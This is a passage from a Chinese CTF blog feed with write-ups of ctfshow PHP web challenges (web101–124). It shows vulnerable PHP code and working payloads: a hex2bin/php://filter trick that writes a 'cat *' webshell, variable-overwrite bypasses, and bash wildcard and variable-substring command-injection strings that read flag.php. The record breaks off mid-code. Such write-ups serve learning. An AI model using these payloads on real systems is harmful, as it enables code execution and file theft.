class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">      <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和上个题差不多，也是用反射类解决的。<br><code>?v1=1&amp;v2=echo new Reflectionclass&amp;v3=;</code>，将0x2d替换掉：<br><code>3c1e313c0x2dbfc60x2d49940x2d938b0x2ddd880411ad8</code>=》<code>3c1e313c-bfc6-4994-938b-dd880411ad8</code><br>但是flag格式最后一个是12位，因此需要爆破出最一位。<br>0-c一个一个尝试就行。</p><h1 id="web102-isnumeric-and-isnumeric绕过"><a href="#web102-isnumeric-and-isnumeric绕过" class="headerlink" title="web102 isnumeric and isnumeric绕过"></a>web102 isnumeric and isnumeric绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">  <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">  <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">  <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>substr() 函数返回字符串的一部分。<br>call_user_func()函数把第一个参数作为回调函数调用<br>file_put_contents() 函数把一个字符串写入文件中。<br>代码分析：v4检测是否进入判断。v2会被删除掉前两个字符，v1调用方法传入删过字符的v2，再将结果写入文件v3。<br>因此核心操作语句在v2。<br>上来有个数字检测，这里要使用hex2bin。<br>php5下is_numeric可识别16进制，如0x2e，然后调用hex2bin转成字符串写入木马，但题目环境没配好，是php7,所以要另换方法。<br>用伪协议写入，所以需要base64编码后转成16进制全是数字的字符串（但是下面这个不行）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&quot;&lt;?=`cat *`;&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br></pre></td></tr></table></figure><p>注意这个上面的不行，因为转换后的hex中除了e有其他的字符，wp中提到了使用的以下这种</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;?=`cat *`;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$a</span>);<span class="comment">//$a=PD89YGNhdCAqYDs=</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">bin2hex</span>(<span class="string">&#x27;PD89YGNhdCAqYDs&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后生成的hex串：<code>5044383959474e6864434171594473</code>（这里的e会被当作科学计数法）为了绕过截断需要在前面随便加两个字符11，v3使用伪协议执行<br>GET：<code>?v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=2.php</code><br>POST传入bin2hex的反函数：<code>v1=hex2bin</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684232663181-750fae44-4eff-4924-a3bd-20e706bf442d.png" alt="image.png"></p><h1 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.*p.*h.*p.*/i&quot;</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Sorry&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>同上题payload</p><h1 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>get，post全传入1即可，或者传入数组<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684233072751-3de90d66-58b6-48e9-884b-c57c50fb0185.png" alt="image.png"></p><h1 id="web105-a-变量覆盖"><a href="#web105-a-变量覆盖" class="headerlink" title="web105 $$a 变量覆盖"></a>web105 $$a 变量覆盖</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$error</span>=<span class="string">&#x27;你还想要flag嘛？&#x27;</span>;</span><br><span class="line"><span class="variable">$suces</span>=<span class="string">&#x27;既然你想要那给你吧！&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;<span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$suces</span>);</span><br></pre></td></tr></table></figure><p>比赛之前遇到好多次这种题了，但是看了wp也没有很好的学明白，看到了一份wp里面讲的很清楚。<br>采用中间变量来解决：<br><code>error=a=flag</code><br>GET中error不能在等号左边。<br>POST中flag不能在等号右边。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684234987314-7d5c585a-f312-477d-8007-4a4571cdfee2.png" alt="image.png"><br>GET：<code>a=flag</code><br>POST：<code>error=a</code><br>这样就达成了一种情况：<br>首先要知道传入的值是文本，<code>$$key=$$value</code>达成了<code>$a=$flag</code>，后半段同理，<code>$error=$a</code>这样就达成了值桥接。这样文末的判断才会判断为正。<br>看了一眼wp发现一个更牛的做法，直接get传入：<br><code>?suces=flag&amp;flag=</code><br>这就是构造的<code>suces=flag=空</code><br>后面的默认传入flag就是空对应到flag。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web118-web122+web124命令执行篇（四）</title>
      <link href="/2023/04/13/web118-web122-web124%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87%EF%BC%88%E5%9B%9B%EF%BC%89-md/"/>
      <url>/2023/04/13/web118-web122-web124%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87%EF%BC%88%E5%9B%9B%EF%BC%89-md/</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考链接：</p><p><a href="https://blog.csdn.net/weixin_46081055/article/details/121721209">https://blog.csdn.net/weixin_46081055/article/details/121721209</a></p></blockquote><h1 id="web118"><a href="#web118" class="headerlink" title="web118"></a>web118</h1><p>题目里面提示了：<code>flag in flag.php</code><br>随便提交一点东西，看到源代码中：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681292185940-62d08e5c-aa0a-41fd-99f7-c0d5ba3983e7.png" alt="image.png"><br>post上传然后system执行，但是没有回显。<br>但是输入会出现evil input，因此想到可能是有过滤。<br>fuzz一下：<br>发现有的字符被过滤掉了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681292787888-6d27b5da-8902-4aae-8a8e-9f2a0bcbd28d.png" alt="image.png"><br>剩余的字符有<code>A-Z</code>，<code>;:&#123;&#125;?#$_,@~</code><br>看了wp学了一个新姿势：以下是在本地测试的。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681293462939-5380ccaf-846d-4c6b-8101-368008933c8a.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681293528467-e3e58553-e477-4503-9732-83c32cda2250.png" alt="image.png"><br>我们到web测试一下：<br>web上的用户名末尾为l，path末尾为n，因此我们可以尝试组合：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;<span class="variable">$IFS</span>????.???</span><br></pre></td></tr></table></figure><p>组合成为nl查找文件。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681294107237-9cb838b1-54a0-4bcf-8595-27aff96f8054.png" alt="image.png"><br>当然也有使用别的字段的方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SHLVL是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时$&#123;SHLVL&#125;=1，然后在此shell中再打开一个shell时$&#123;SHLVL&#125;=2。</span><br><span class="line">$&#123;PWD:$&#123;#&#125;:$&#123;SHLVL&#125;&#125;就输出/</span><br><span class="line"></span><br><span class="line">$&#123;#&#125;是0，$&#123;SHLVL&#125;为1</span><br><span class="line">$&#123;#PWD&#125;是回显字符数，$&#123;PWD&#125; 是/root，$&#123;#PWD&#125;是5</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#$&#123;RANDOM&#125;是随机数，$&#123;#RANDOM&#125;一般是5，也可能是4</span><br><span class="line">$&#123;PATH:$&#123;#HOME&#125;:$&#123;#SHLVL&#125;&#125;$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125; ?$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125;??.???</span><br><span class="line"></span><br><span class="line">#其他师傅</span><br><span class="line">$&#123;PATH:~A&#125;$&#123;PATH:$&#123;#TERM&#125;:$&#123;SHLVL:~A&#125;&#125; ????.???</span><br></pre></td></tr></table></figure><h1 id="web119"><a href="#web119" class="headerlink" title="web119"></a>web119</h1><p>这道题把<code>$&#123;PATH&#125;</code>给禁用了。因此我们需要想出其他解法。<br>payload：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span>&#123;<span class="built_in">PWD</span>:<span class="variable">$</span>&#123;<span class="comment">#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125; ????.???</span></span><br><span class="line"><span class="comment"># pwd=/var/www/html</span></span><br><span class="line"><span class="comment"># USER=www-data</span></span><br><span class="line"><span class="comment"># payload即为 /???/?at ????.???</span></span><br><span class="line">为了构造/bin/<span class="built_in">cat</span> </span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681311550803-b62629a3-be2a-45fa-b3ff-1969672a8348.png" alt="image.png"><br>也可以只要a进行构造</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span>&#123;<span class="built_in">PWD</span>::<span class="variable">$</span>&#123;<span class="comment">#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</span></span><br><span class="line">/???/?a? ????.???</span><br></pre></td></tr></table></figure><p>这两个查看的时候都需要打开f12查看。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681311675416-57a9681f-d78b-491f-bc98-44afa1576ad2.png" alt="image.png"></p><h1 id="web120"><a href="#web120" class="headerlink" title="web120"></a>web120</h1><p>fuzz一下看看剩余什么可用字符：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">//fuzz一下看看剩余什么字符</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">33</span>; <span class="variable">$i</span> &lt;= <span class="number">126</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&quot;</span>, <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681312167771-8de604f0-ffaf-4aa5-850f-4e1bef1d02dc.png" alt="image.png"><br>剩余：<code>#$.:;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ_&#123;&#125;~</code><br>通过观察，应该是还是用上一道题类似的方法。但是这次过滤了PATH|BASH|HOME三个字段。<br>所以构建payload：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span>&#123;<span class="built_in">PWD</span>::<span class="variable">$</span>&#123;<span class="comment">#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</span></span><br><span class="line">/???/?a? ????.???</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681312602829-4b269e50-195a-4a00-a726-94d2b1eda48c.png" alt="image.png"></p><h1 id="web121"><a href="#web121" class="headerlink" title="web121"></a>web121</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;</span>|\<span class="string">&quot;|\`|\||\,/&#x27;, <span class="variable">$code</span>))&#123;    </span></span><br><span class="line"><span class="string">        if(strlen(<span class="variable">$code</span>)&gt;65)&#123;</span></span><br><span class="line"><span class="string">            echo &#x27;&lt;div align=&quot;</span>center<span class="string">&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        else&#123;</span></span><br><span class="line"><span class="string">        echo &#x27;&lt;div align=&quot;</span>center<span class="string">&quot;&gt;&#x27;.system(<span class="variable">$code</span>).&#x27;&lt;/div&gt;&#x27;;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    else&#123;</span></span><br><span class="line"><span class="string">     echo &#x27;&lt;div align=&quot;</span>center<span class="string">&quot;&gt;evil input&lt;/div&gt;&#x27;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>比上一题过滤更加严密，把<code>FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME</code>都过滤掉了。<br>好像把<code>$&#123;PWD&#125;</code>留下了。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">code=<span class="variable">$</span>&#123;<span class="built_in">PWD</span>::<span class="variable">$</span>&#123;<span class="comment">#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;#?&#125;&#125;?? ????.???</span></span><br><span class="line"></span><br><span class="line">/???/<span class="built_in">r</span>?? ????.???</span><br><span class="line">/bin/rev</span><br></pre></td></tr></table></figure><p><code>$&#123;?&#125;=0，$&#123;#?&#125;=1</code>中(<code>$?</code>是表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误)<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681313098244-77c8ab4a-3462-446c-a5e6-dda6f36c5048.png" alt="image.png"><br>在本地调转一下即可：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681313310818-b3f49950-e3bc-4b9b-bdad-3b3494168abb.png" alt="image.png"></p><h2 id="和"><a href="#和" class="headerlink" title="${?}和$?"></a>${?}和$?</h2><blockquote><p><a href="https://www.cnblogs.com/chengd/p/7803664.html">https://www.cnblogs.com/chengd/p/7803664.html</a></p></blockquote><h1 id="web122"><a href="#web122" class="headerlink" title="web122"></a>web122</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\&gt;|\&#x27;</span>|\<span class="string">&quot;|\`|\||\,/&#x27;, <span class="variable">$code</span>))&#123;    </span></span><br><span class="line"><span class="string">        if(strlen(<span class="variable">$code</span>)&gt;65)&#123;</span></span><br><span class="line"><span class="string">            echo &#x27;&lt;div align=&quot;</span>center<span class="string">&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        else&#123;</span></span><br><span class="line"><span class="string">        echo &#x27;&lt;div align=&quot;</span>center<span class="string">&quot;&gt;&#x27;.system(<span class="variable">$code</span>).&#x27;&lt;/div&gt;&#x27;;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    else&#123;</span></span><br><span class="line"><span class="string">     echo &#x27;&lt;div align=&quot;</span>center<span class="string">&quot;&gt;evil input&lt;/div&gt;&#x27;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>PWD这回也没了。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=&lt;A;<span class="variable">$</span>&#123;HOME::<span class="variable">$</span>?&#125;???<span class="variable">$</span>&#123;HOME::<span class="variable">$</span>?&#125;?????<span class="variable">$</span>&#123;RANDOM::<span class="variable">$</span>?&#125; ????.???</span><br></pre></td></tr></table></figure><p>一般情况下<code>#RANDOM</code>返回的值为4或5.<br>因此这个是概率触发。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681314039095-ad8c4a2b-4193-4cb8-9cb9-ec532b413d90.png" alt="image.png"><br>base64解密：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681314066321-4698fa50-eab6-4ff7-acd7-da64bee136ac.png" alt="image.png"><br>在末尾补一个<code>&#125;</code>即可。</p><h1 id="web124"><a href="#web124" class="headerlink" title="web124"></a>web124</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 